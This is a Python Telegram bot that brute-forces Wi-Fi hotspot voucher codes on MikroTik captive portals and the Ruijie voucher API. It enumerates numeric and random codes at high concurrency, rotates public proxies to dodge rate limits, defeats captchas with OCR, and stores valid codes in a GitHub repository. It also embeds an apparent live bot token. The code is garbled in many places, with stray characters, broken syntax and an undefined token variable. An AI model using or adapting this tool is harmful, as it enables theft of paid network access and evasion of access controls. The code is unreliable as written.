#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WOOLAY DUAL-ENGINE — Final Verified"""

import os, sys, re, json,-random, string, time, asyncio, base64, uuid
from urllib.parse import urlparse

import aiohttp
from aiohttp import web
from aiohttp_socks import ProxyConnector

try:
    import cv2, numpy as np, ddddocr
    HAS_OCR = True
except ImportError:
    HAS_OCR = False

from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN    = '8806693453:AAEK1F7FTsAHMc5PdfeIYeIlWHJgbnGRb8o'
ADMIN_ID     = "8806693453"
OWNER        = "Woolay"
REPO_OWNER   = "repo"
REPO_NAME    = "Lord_of_barkness"
CONCURRENCY  = 1000
BATCH_SIZE   = 500
REQ_TIMEOUT  = 15

UAS = [
    "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
]

bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}; scan_tasks = {}; success_texts = {}; success_msgs = {}; retry_counts = {}
main_session = None; _voucher_sem = None; _hit_queue = None

def get_hit_queue():
    global _hit_queue
    if _hit_queue is None: _hit_queue = asyncio@asyncio.Queue()
    return _hit_queue

# ═══════════════════════════════════════════════════════════════
#  PROXY
# ═══════════════════════════════════════════════════════════════

PROXY_POOL = []; BAD_PROXIES = set(); PROXY_LOCK = asyncio.Lock()

async def fetch_proxies():
    global PROXY_POOL
    sources = [
        "https://api.openproxylist.xyz/http.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    ]
    found = []
    t = aiohttp.ClientTimeout(total=10)
    async with aiohttp.ClientSession(timeout=t) as s:
        for url in sources:
            try:
                async with s.get(url) as r:
                    if r.status == 200:
                       &for line in (await r.text()).splitlines():
                            line = line.strip()
                            if line and ":" in line and not line.startswith("#"):
                                if not line.startswith(("http://","https://","socks4://","socks5://")): line = "http://" + line
                                found.append(line)
            except Exception: continue
    async with PROXY_LOCK:
        if found:
            PROXY_POOL = list(set(found))
            print(f"[Proxy] {len(PROXY_POOL)} loaded")

async def proxy_daemon():
    while True:
        await asyncio.sleep(1800)
        await fetch_proxies()

async def get_proxy():
    async with PROXY_LOCK:
        if not PROXY_POOL: return None
        valid = [p for p in PROXY_POOL if p not in BAD_PROXIES]
        if not valid: BAD_PROXIES.clear(); valid = list(PROXY_POOL)
        return random.choice(valid) if valid else None

async def mark_bad(proxy):
    if proxy:
        async with PROXY_LOCK: BAD_PROXIES.add(proxy)

# ═══════════════════════════════════════════════════════════════
#  WEB + GITHUB
# ═══════════════════════════════════════════════════════════════

async def web_handle(request): return web.Response(text=f"{OWNER} Active")

async def web_server():
    app = web.Application()
    app.router.add_get("/", web_handle)
    runner = web.AppRunner7()
    await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", int(os.environ.get("PORT", 8099))).start()

async def gh_get(path):
    try:
        url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
        headers = {"Authorization": f"token {GITHUB_TOKEN}"}
        async with main_session.get(url, headers=headers) as r:
            if r.status == 200:
                data = await r.json()
                content = base64.b64decode(data["content"]).decode()
                return json.loads(content), data["sha"]
    except Exception: pass
    return {}, None

async def gh_put(path, content, sha, msg):
    try:
        url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
        headers = {"Authorization": f"token {GITHUB_TOKEN}", "Content-Type": "application/json"}
        encoded = base64.b64encode(json.dumps(content).encode()).decode()
        async with main_session.put(url, headers=headers, json={"message": msg, "content": encoded, "sha": sha}) as r: return await r.text()
    except Exception: return ""

async def github_sync():
    while True:
        await asyncio.sleep(60)
        q = get_hit_queue(); items = []
        while not q.empty():
            try: items.append(await q.get())
            except Exception: break
        if items:
            try:
                results, sha = await gh_get("result.json")
                for item in items:
                    cid = str(item["chat_id"]); results.setdefault(cid, [])
                    if item["code"] not in results[cid]: results[cid].append(item["code"])
                await gh_put("result.json", results, sha, "Sync")
            except Exception: pass

# ═══════════════════════════════════════════════════════════════
#  KEYBOARDS
# ═══════════════════════════════════════════════════════════════

def kb_main():
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton("🔑 Key", callback_data="menu_key"),
        InlineKeyboardButton("📥 Input URL", callback_data="menu_input"),
        InlineKeyboardButton("⚡ Scan", callback_data="menu_scan"),
        InlineKeyboardButton("🔄 Recheck", callback_data="menu_recheck"),
        InlineKeyboardButton("📋 Result", callback_data="menu_result"),
        InlineKeyboardButton("⏹ Stop", callback_data="menu_stop"),
        InlineKeyboardButton("📊 Status", callback_data="menu_status"),
        InlineKeyboardButton("❓ Help", callback_data="menu_help"))
    return m

def kb_platform():
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton("🌐 Ruijie", callback_data="plat_ruijie"),
        InlineKeyboardButton("📶 MikroTik", callback_data="plat_mikrotik"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return m

def kb_mode():
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton("🩸 6-digit", callback_data="scan_6"),
        InlineKeyboardButton("🩸 7-digit", callback_data="scan_7"),
        InlineKeyboardButton("🩸 8-digit", callback_data="scan_8"),
        InlineKeyboardButton("🦇 6-ascii", callback_data="scan_ascii"),
        InlineKeyboardButton("☠️ mix", callback_data="scan_all"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return m

# ═══════════════════════════════════════════════════════════════
#  CALLBACKS
# ═══════════════════════════════════════════════════════════════

@bot.message_handler(commands=["start"])
async def cmd_start(message):
    await bot.reply_to(message, f"⚔️ {OWNER} DUAL BOT\n\nမြန်မာဘာသာ UI • MikroTik + Ruijie", parse_mode="Markdown", reply_markup=kb_main())

@bot.callback_query_handler(func=lambda call: True)
async def on_callback(call):
    cid = call.message.chat.id; mid = call.message.message_id
    try:
        if call.data == "menu_back":
            await bot.edit_message_text(f"⚔️ {OWNER}",0, chat_id=cid, message_id=mid, parse_mode="Markdown", reply_markup=kb_main())
        elif call.data == "menu_key":
            user_data[cid] = {}
            await bot.edit_message_text("✅ **Key OK!** Input URL နှိပ်ပါ", chat_id=cid, message_id=mid, parse_mode="Markdown", reply_markup=kb_main())
        elif call.data == "menu_input":
            user_data.setdefault(cid, {})["awaiting_url"] = True
            await bot.edit_message_text(
                "📥 <b>URL ကို ဒီမှာ ရိုက်ထည့ေပါ :</b>\n\n"
                "📶 MikroTik:\n<code>http://zinkyaw.com/login?dst=...</code>\n\n"
                "🌐 Ruijie:\n<code>https://portal-as.ruijienetworks.com/download/...</code>",
                chat_id=cid, message_id=mid, parse_mode="HTML", reply_markup=kb_main())
        elif call.data == "menu_scan":
            await bot.edit_message_text("🌐 **Platform ရွ9း:**", chat_id=cid, message_id=mid, parse_mode="Markdown", reply_markup=kb_platform())
        elif call.data == "plat_ruijie":
            user_data.setdefault(cid, {})["platform"] = "ruijie"
            await bot.edit_message_text("📜 **Ruijie Mode:**", chat_id=cid, message_id=mid, parse_mode="Markdown", reply_markup=kb_mode())
        elif call.data == "plat_mikrotik":
            user_data.setdefault(cid, {})["platform"] = "mikrotik"
            await bot.edit_message_text("📜 **MikroTik Mode:**", chat_id=cid, message_id=mid, parse_mode="Markdown", reply_markup=kb_mode())
        elif call.data.startswith("scan_"):
            mode_map = {"scan_6":"6","scan_7":"7","scan_8":"8","scan_ascii":"ascii","scan_all":"all"}
            mode = mode_map.get(call.data, "7")
            user_data.setdefault(cid, {})["scan_mode"] = mode
            plat = user_data[cid].get("platform", "mikrotik")
            await bot.edit_message_text(f"⚡ **Starting...** `{plat}` | `{mode}`", chat_id=cid, message_id=mid, parse_mode="Markdown", reply_markup=kb_main())
            class FM:
                def __init__(self, c): self.chat = type('O',(object,),{'id':c})()
            await cmd_scan(FM(cid), mode)
        elif call.data == "menu_recheck":
            await do_recheck(call.message)
        elif call.data == "menu_result":
            await cmd_result(call.message)
        elif call.data == "menu_stop":
            await cmd_stop(call.message)
            try: await bot.edit_message_text("⏹ **Stopped**", chat_id=cid, message_id=mid, parse_mode="Markdown", reply_markup=kb_main())
            except: pass
        elif call.data == "menu_status":
            active = sum(1 for d in scan_tasks.values() if not d["task"].done())
            await bot.edit_message_text(f"📊 Scans: `{active}` | Proxies: `{len(PROXY_POOL)}`", chat_id=cid, message_id=mid, parse_mode="Markdown", reply_markup=kb_main())
        elif call.data == "menu_help":
            await bot.edit_message_text("📖 Key → URL ရိုက် → Scan → Stop", chat_id=cid, message_id=mid, parse_mode="Markdown", reply_markup=kb_main())
    except Exception: pass
    await bot.answer_callback_query(call.id)

# ═══════════════════════════════════════════════════════════════
#  TEXT HANDLER — URL လက်ခံ
# ═══════════════════════════════════════════════════════════════

@bot.message_handler(func=lambda m: True)
async def handle_text(message):
    cid = message.chat.id; text = message.text.strip()
    if text.startswith("/start"): return

    if user_data.get(cid, {}).get("awaiting_url"):
        user_data[cid]["awaiting_url"] = False
        user_data[cid]["session_url"] = text
        plat = user_data[cid].get("platform", "mikrotik")
        await bot.reply_to(message, f"✅ <b>URL Saved!</b>\n\n<code>{text}</code>\n\nPlatform: <code>{plat.upper()}</code>\n\n⚡ Scan နှိပေပါ", parse_mode="HTML", reply_markup=kb_main())
        return

    if text.startswith("/input "):
        url = text[7:].strip()
        if url:
            user_data.setdefault(cid, {})["session_url"] = url
            await bot.reply_to(message, f"✅ <b>URL Saved!</b>\n\n<code>{url}</code>\n\n⚡ Scan နှိပါ", parse_mode="HTML", reply_markup=kb_main())
            return

    if text == "/key":
        user_data[cid] = {}; await bot.reply_to(message, "✅ OK!", parse_mode="Markdown", reply_markup=kb_main()); return
    if text == "/scan": await cmd_scan(message); return
    if text == "/stop": await cmd_stop(message); return
    if text == "/result": await cmd_result(message); return

# ═══════════════════════════════════════════════════════════════
#  COMMANDS
# ═══════════════════════════════════════════════════════════════

async def cmd_scan(message, mode=None):
    if mode is None:
        await bot.reply_to(message, "🌐 Platform ရွ9း:", parse_mode="Markdown", reply_markup=kb_platform()); return
    cid = message.chat.id
    if cid not in user_data or "session_url" not in user_data[cid]:
        await bot.reply_to(message, "⚠️ URL အရင်ထည့ေပါ!", parse_mode="Markdown", reply_markup=kb_main()); return
    if cid in scan_tasks and not scan_tasks[cid]["task"].done():
        await bot.reply_to(message, "⚠️ Running! `/stop` first", parse_mode="Markdown", reply_markup=kb_main()); return
    progress = await bot.send_message(cid, "🔮 Starting...", parse_mode="Markdown", reply_markup=kb_main())
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(run_scan(mode, cid, user_data[cid]["session_url"], scan_id, message=message, progress_msg=progress))
    scan_tasks[cid] = {"task": task, "stop": False, "scan_id": scan_id}

async def cmd_stop(message):
    cid = message.chat.id; d = scan_tasks.get(cid)
    if d and not d["task"].done():
        d["stop"] = True; d["task"].cancel()
        await bot.reply_to(message, "🛑 **Stopped**", parse_mode="Markdown", reply_markup=kb_main())
    else:
        await bot.reply_to(message, "⚠️ Not running", parse_mode="Markdown", reply_markup=kb_main())

async def cmd_result(message):
    results, _ = await gh_get("result.json"); cid_str = str(message.chat.id)
    if cid_str in results and results[cid_str]:
        await bot.reply_to(message, f"📋 **Hits:**\n\n" + "\n".join(results[cid_str]), parse_mode="Markdown", reply_markup=kb_main())
    else:
        await bot.reply_to(message, "🖤 No hits yet", parse_mode="Markdown", reply_markup=kb_main())

async def do_recheck(message):
    cid = message.chat.id
    if cid not in user_data or "session_url" not in user_data[cid]: return
    await bot.reply_to(message, "🔄 Rechecking...", parse_mode="Markdown")
    results, _ = await gh_get("result.json"); cid_str = str(cid)
    if cid_str not in results or not results[cid_str]: return
    valid = []
    for code in results[cid_str]:
        res = await do_check(user_data[cid]["session_url"], code, cid, None, True, message)
        if res: valid.append(res)
    await bot.reply_to(message, f"✅ Valid: {valid}" if valid else "❌ All expired", parse_mode="Markdown", reply_markup=kb_main())

# ═══════════════════════════════════════════════════════════════
#  OCR
# ═══════════════════════════════════════════════════════════════

_ocr_inst = None
def get_ocr():
    global _ocr_inst
    if _ocr_inst is None and HAS_OCR:
        try: _ocr_inst = ddddocr.DdddOcr(show_ad=False)
        except: return None
    return _ocr_inst

async def solve_captcha(sess, sid):
    if not HAS_OCR: return None
    try:
        url = f"https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={sid}&_t={time.time()}"
        async with sess.get(url) as r: img = await r.read()
        ocr = get_ocr()
        if not ocr or not img: return None
        def _do_ocr():
            try: return ocr.classification(img).upper()
            except: return None
        text = await asyncio.to_thread(_do_ocr)
        if not text: return None
        async with sess.post("https://portal-as.ruijienetworks.com/api/auth/captcha/verify", json={"sessionId": sid, "authCode": text}) as v:
            if (await v.json()).get("success") is True: return text
    except: pass
    return None

# ═══════════════════════════════════════════════════════════════
#  CHECKER
# ═══════════════════════════════════════════════════════════════

async def do_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    if not recheck:
        task = scan_tasks.get(chat_id)
        if not task or task.get("scan_id") != scan_id: return

    platform = user_data.get(chat_id, {}).get("platform", "mikrotik")
    response = None

    for attempt in range(3):
        proxy = await get_proxy(); connector = None
        try:
            if proxy and proxy.startswith("socks"): connector = ProxyConnector.from_url(proxy, rdns=True)
            elif proxy: connector = ProxyConnector.from_url(proxy)
        except: connector = None

        timeout = aiohttp.ClientTimeout(total=REQ_TIMEOUT)
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout, cookie_jar=aiohttp.CookieJar()) as s:
                                if platform == "mikrotik":
                    from urllib.parse import urlparse, parse_qs
                    
                    # URL အစမှာ http ပါစေရန် သေချာစေခြင်း
                    clean_url = session_url.strip()
                    if not clean_url.lower().startswith("http"):
                        clean_url = "http://" + clean_url

                    parsed = urlparse(clean_url)
                    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    origin = f"{parsed.scheme}://{parsed.netloc}"
                    
                    # URL ထဲက dst ပါလာလျှင် အလိုအလျောက် ဖြုတ်ထုတ်ယူရန်
                    query_params = parse_qs(parsed.query)
                    dst_val = query_params.get("dst", ["http://connectivitycheck.gstatic.com/generate_204"])[0]

                    headers = {
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Origin": origin, 
                        "Referer": clean_url,
                        "User-Agent": random.choice(UAS),
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Upgrade-Insecure-Requests": "1",
                    }
                    data = {
                        "dst": dst_val, 
                        "popup": "true", 
                        "username": code, 
                        "password": ""
                    }
                    async with s.post(base, data=data, headers=headers, ssl=False, allow_redirects=True) as req:
                        response = await req.text()

                else:
                    m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", session_url)
                    sid = m.group(1) if m else "default"
                    auth = await solve_captcha(s, sid)
                    if not auth: auth = "TEST"
                    headers = {
                        "content-type": "application/json",
                        "origin": "https://portal-as.ruijienetworks.com",
                        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={sid}",
                        "user-agent": random.choice(UAS),
                    }
                    jdata = {"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": auth}
                    async with s.post("https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US", json=jdata, headers=headers) as req:
                        response = await req.text()
        except Exception:
            if proxy: await mark_bad(proxy)
            continue

        if response and any(w in response.lower() for w in ["request limited", "limitation"]):
            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
            if proxy: await mark_bad(proxy)
            continue
        break

    if not response: return

    lo = response.lower(); is_hit = False

    if platform == "mikrotik":
        if "you are logged in" in lo or "logout" in lo:
G       is_hit = True
    elif "invalid username or password" in lo:
            is_hit = False
        elif "already authorizing" in lo or "retry later" in lo:
            is_hit = False
        else:
            if len(response) > 200 and "login" not in lo and "error" not in lo and "password" not in lo and "invalid" not in lo:
                is_hit = True
    else:
        if "logonurl" in lo or '"success":true' in lo:
            is_hit = True

    if is_hit:
        if recheck: return code
        success_texts.setdefault(chat_id, [])
        success_texts[chat_id].append(f"🎫 `{code}` [{platform.upper()}]")
        code_line = "\n".join(success_texts[chat_id])
        await get_hit_queue().put({"chat_id": chat_id, "code": code})
        try:
            with open("hits.txt", "a") as f: f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {code}\n")
        except: pass
        if message:
            try:
                if chat_id not in success_msgs:
                    sent = await bot.send_message(chat_id, f"✅ **Hits:**\n\n{code_line}", parse_mode="Markdown", reply_markup=kb_main())
                    success_msgs[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(chat_id=chat_id, message_id=success_msgs[chat_id], text=f"✅ **Hits:**\n\n{code_line}", parse_mode="Markdown", reply_markup=kb_main())
            except: pass

# ═══════════════════════════════════════════════════════════════
#  SCANNER
# ═══════════════════════════════════════════════════════════════

async def run_scan(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    global _voucher_sem
    if _voucher_sem is None: _voucher_sem = asyncio.Semaphore(CONCURRENCY)
    checked = 0; t0 = time.monotonic(); last_update = 0; tried_set = set()
    counter = 0
    try> try:
        cf = f"counter_{chat_id}.txt"
        if os.path.exists(cf):
            with open(cf, "r") as f: counter = int(f.read().strip())
    except: counter = 0

    try:
        while True:
            task = scan_tasks.get(chat_id)
            if not task or task.get("scan_id") != scan_id or task.get("stop"): break

            batch = []
            for _ in range(BATCH_SIZE):
                if mode in ("6","7","8"):
                    code = str(counter).zCill(int(mode)); counter += 1
                    if counter >= 10 ** int(mode): counter = 0
                elif mode == "ascii": code = "".join(random.choices(string.ascii_lowercase, k=6))
                elif mode == "all": code = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
                else: code = str(counter).zfill(7); counter += 1
                if code not in tried_set: tried_set.add(code); batch.append(code)
                if len(tried_set) > 500000: tried_set = set()

            if not batch: continue
            sem = _voucher_sem; cur_url = session_url; cur_cid = chat_id; cur_sid = scan_id; cur_msg = message

            async def _check_one(c):
                async with sem: await do_check(cur_url, c, cur_cid, cur_sid, message=cur_msg)

            await asyncio.gather(*[_check_one(c) for c in batch], return_exceptions=True)
            checked += len(batch)

            now = time.monotonic()
            if now - last_update >= 3:
                elapsed = now - t0; speed = int(checked / elapsed * 60) if elapsed > 0 else 0
                found = len(success_texts.get(chat_id, [])); retries = retry_counts.get(chat_id, 0)
                text = (f"╔══════════════════════════╗\n"
                        f"║  ⚔️ {OWNER} LIVE ⚔️   ║\n"
                        f"╚══════════════════════════╝\n\n"
                        f"🔍 **SEARCHING...7**\n\n"
                        f"📦 Tested: `{checked:,}`\n"
                        f"⚡ Speed: `{speed:,} c/m`\n"
                        f"✅ Hits: `{found}`\n"
                        f"🔁 Retries: `{retries}`\n"
                        f"🔢 Counter: `{counter:,}`")
                try:
                    await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text, parse_mode="Markdown", reply_markup=kb_main())
                    last_update = now
                except: pass

            if int(time.time()) % 10 == 0:
                try:
                    with open(f"counter_{chat_id}.txt", "w") as f: f.write(str(counter))
                except: pass

        scan_tasks.pop(chat_id, None)
    finally:
        scan_tasks.pop(chat_id, None)

# ═══════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════

async def polling():
    backoff = 5
    while True:
        try:
            print(f"[{OWNER}] Polling...")
            await bot.infinity_polling(timeout=30, request_timeout=45, skip_pending=True)
        except Exception as e:
            print(f"[Error] {e}, retry in {backoff}s")
            await asyncio.sleep(backoff); backoff = min(backoff * 2, 60)

async def main():
    global main_session
    conn = aiohttp.TCPConnector(limit=5000, ttl_dns_cache=300, ssl=False)
    main_session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=20), connector=conn, connector_owner=False)
    try:
        asyncio.create_task(web_server())
        asyncio.create_task(github_sync())
        asyncio.create_task(proxy_daemon())
        print(f"[{OWNER}] Started!")
        await polling()
    except Exception as e: print(f"[Main] {e}")
    finally: await main_session.close(); await conn.close()

if __name__ == "__main__":
    try: asyncio.run(main())
    except KeyboardInterrupt=KeyboardInterrupt: print("Stopped.")
